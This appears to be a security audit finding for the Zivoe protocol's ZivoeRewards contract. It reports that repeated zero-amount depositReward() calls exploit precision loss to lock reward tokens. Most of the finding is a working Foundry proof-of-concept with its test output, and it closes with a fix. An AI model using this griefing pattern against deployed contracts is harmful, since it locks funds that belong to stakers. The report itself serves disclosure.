Passive Rouge Peacock

medium

# ````depositReward()```` with zero amount to get reward tokens stuck in ````ZivoeRewards```` contracts

## Summary
````ZivoeRewards.depositReward()```` has no access control, attackers can call it with zero amount of ````reward```` to get some reward tokens stuck in contract. The locked amount could be significant especially when reward tokens have small decimals such as ````USDT/USDC/WBTC````.

## Vulnerability Detail
The issue arises due to precision loss on L233 and L237.
```solidity
File: zivoe-core-foundry\src\ZivoeRewards.sol
228:     function depositReward(address _rewardsToken, uint256 reward) external updateReward(address(0)) nonReentrant {
...
232:         if (block.timestamp >= rewardData[_rewardsToken].periodFinish) {
233:             rewardData[_rewardsToken].rewardRate = reward.div(rewardData[_rewardsToken].rewardsDuration);
234:         } else {
...
237:             rewardData[_rewardsToken].rewardRate = reward.add(leftover).div(rewardData[_rewardsToken].rewardsDuration);
238:         }
...
243:     }

```

The following PoC shows two cases that ````654 USDC```` and ````6.6 WBTC```` get stuck in ````ZivoeRewards(stZVE)```` contract after ````20```` calls on ````depositReward()```` with zero amount of ````reward````.
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "../Utility/Utility.sol";
import "forge-std/console2.sol";

contract TestDepositRewardBug is Utility {
    address alice;
    function setUp() public {
        vm.createSelectFork("https://mainnet.gateway.tenderly.co");
        deployCore(false);

        deal(USDC, address(zvl), 1_000e6); // 1,000 USDC
        deal(WBTC, address(zvl), 10e8); // 10 wBTC
        vm.startPrank(address(zvl));
        stZVE.addReward(USDC, 365 days);
        stZVE.addReward(WBTC, 365 days);
        IERC20(USDC).approve(address(stZVE), type(uint256).max);
        stZVE.depositReward(USDC, 1_000e6);
        IERC20(WBTC).approve(address(stZVE), type(uint256).max);
        stZVE.depositReward(WBTC, 10e8);
        vm.stopPrank();


        alice = makeAddr("alice");
        deal(address(ZVE), alice, 1_000e18);
        assertEq(ZVE.balanceOf(alice), 1_000e18);

        vm.startPrank(alice);
        ZVE.approve(address(stZVE), type(uint256).max);
        stZVE.stake(1_000e18);
        vm.stopPrank();

        // alice is the only staker, and is expected to get all rewards
        assertEq(1_000e18, stZVE.totalSupply());
    }

    function testAttackOnUSDCReward() public {
        uint256 timestamp = block.timestamp;
        for (uint256 i; i < 20; ++i) {   
            vm.warp(timestamp += 12);
            // deposit nothing
            stZVE.depositReward(USDC, 0);
        }

        vm.warp(timestamp + 365 days + 1); // make sure all reward distributed
        vm.prank(alice);
        stZVE.getRewards();
        uint256 balance = IERC20(USDC).balanceOf(alice);
        assertApproxEqAbs(346e6, balance, 1e6);
        balance = IERC20(USDC).balanceOf(address(stZVE));
        assertApproxEqAbs(654e6, balance, 1e6);
        console2.log("Expected reward: 1,000 USDC, actual reward: 346 USDC, locked: 654 USDC");
    }

    function testAttackOnWBTCReward() public {
        uint256 timestamp = block.timestamp;
        for (uint256 i; i < 20; ++i) {   
            vm.warp(timestamp += 12);
            // deposit nothing
            stZVE.depositReward(WBTC, 0);
        }

        vm.warp(timestamp + 365 days + 1); // make sure all reward distributed
        vm.prank(alice);
        stZVE.getRewards();
        uint256 balance = IERC20(WBTC).balanceOf(alice);
        assertApproxEqAbs(3.4e8, balance, 0.1e8);
        balance = IERC20(WBTC).balanceOf(address(stZVE));
        assertApproxEqAbs(6.6e8, balance, 0.1e8);
        console2.log("Expected reward: 10 WBTC, actual reward: 3.4 WBTC, locked: 6.6 WBTC");
    }
}
```

The test log:
```solidity
2024-03-zivoe\zivoe-core-testing> forge test --mc TestDepositRewardBug -vv
[⠰] Compiling...
No files changed, compilation skipped

Ran 2 tests for src/TESTS_Core/Bug_DepositReward.t.sol:TestDepositRewardBug
[PASS] testAttackOnUSDCReward() (gas: 822088)
Logs:
  Expected reward: 1,000 USDC, actual reward: 346 USDC, locked: 654 USDC

[PASS] testAttackOnWBTCReward() (gas: 788716)
Logs:
  Expected reward: 10 WBTC, actual reward: 3.4 WBTC, locked: 6.6 WBTC

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 30.37s (5.20s CPU time)

Ran 1 test suite in 30.41s (30.37s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)

```
## Impact
Fund get stuck in contract

## Code Snippet
https://github.com/sherlock-audit/2024-03-zivoe/blob/d4111645b19a1ad3ccc899bea073b6f19be04ccd/zivoe-core-foundry/src/ZivoeRewards.sol#L228C14-L228C27

## Tool used

Manual Review

## Recommendation
Increasing the precision of ````rewardRate```` by ````1e18````.
